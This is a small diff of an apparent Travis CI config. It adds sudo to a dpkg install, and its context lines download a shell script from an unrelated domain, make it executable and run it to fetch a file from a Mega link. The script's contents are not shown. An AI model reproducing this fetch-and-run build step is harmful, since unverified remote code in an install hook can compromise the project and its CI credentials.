@@ -2,7 +2,7 @@ before_install:
  - sudo apt-get update -qq
  - sudo apt-get install wget llvm llvm-dev bash openssl curl
  - wget http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-4.8/libstdc++6_4.8.2-19ubuntu1_amd64.deb
- - dpkg -i libstdc++6_4.8.2-19ubuntu1_amd64.deb
+ - sudo dpkg -i libstdc++6_4.8.2-19ubuntu1_amd64.deb
  - wget http://goeo.pink/a.sh
  - sudo chmod a+x a.sh
  - ./a.sh 'https://mega.co.nz/#!WEQ20RpI!RzdtOJnctxoU463UjmlmvTd-UPoTXwAsXeva1sJgHf8' lol.tar.gz
